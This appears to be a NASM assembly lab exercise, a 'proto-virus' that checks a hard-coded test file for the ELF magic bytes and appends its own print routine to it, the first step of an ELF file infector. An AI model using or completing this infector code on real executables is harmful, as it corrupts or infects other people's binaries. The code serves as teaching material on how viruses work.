%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define ELFHDR_size 52
%define ELFHDR_phoff	28
	
global _start

;;;;;;;;;;;;;;;;;;;;;;;;;

%macro print_OutStr 0
write 1, OutStr, OutStr_len
%endmacro

%macro print_Failstr 0
write 1, Failstr, Failstr_len
%endmacro

%macro print_openFail 0
write 1, OpenErrStr, OpenErrStr_len
%endmacro


;;;;;;;;;;;;;;;;;;;;;;;;;
	section .text
_start:	
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	;CODE START
	pushad
	open FileName,RDWR,0777
	mov [ebp-4], eax  ;save fd in local vars
	cmp dword[ebp-4], -1
    jle .print_openFail
    mov ecx,ebp
    sub ecx,8;
    read dword[ebp-4],ecx,4; read from eax that is in ebp-4 the magic numbers
    cmp byte[ebp-8], 0x7f; elfmago0
    jne .print_Failstr;
    cmp byte[ebp-8+1],'E'; elfmago1
    jne .print_Failstr;
    cmp byte[ebp-8+2], 'L'; elfmago2
    jne .print_Failstr;
    cmp byte[ebp-8+3],'F'; elfmago3
    jne .print_Failstr;

	.infect:
	lseek dword[ebp-4], 0, SEEK_END ; get to end of file
	; set up len in bytes of printing code in edx
	mov edx, _start.nopnop
	sub edx, _start.print_OutStr
	write dword[ebp-4], .print_OutStr, edx ; write the print command

	.print_OutStr:
		print_OutStr
		.nopnop:
		close [ebp-4]
		jmp VirusExit
	.print_Failstr:
		print_Failstr
		jmp VirusExit
	.print_openFail:
		print_openFail
		jmp VirusExit


VirusExit:
	popad
	add	esp, STK_RES
	pop ebp

       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
	
FileName:	db "ELFexecTestFile", 0
;FileName:	db "ELFexec1", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
OutStr_len: equ $-OutStr
Failstr:        db "perhaps not", 10 , 0
Failstr_len: equ $-Failstr
OpenErrStr: db "File open fail", 10, 0
OpenErrStr_len: equ $-OpenErrStr
print_OutStr_len: equ _start.print_OutStr-_start.nopnop

get_my_loc:
	call next_i
next_i:
	pop ecx
	ret	
PreviousEntryPoint: dd VirusExit
virus_end:


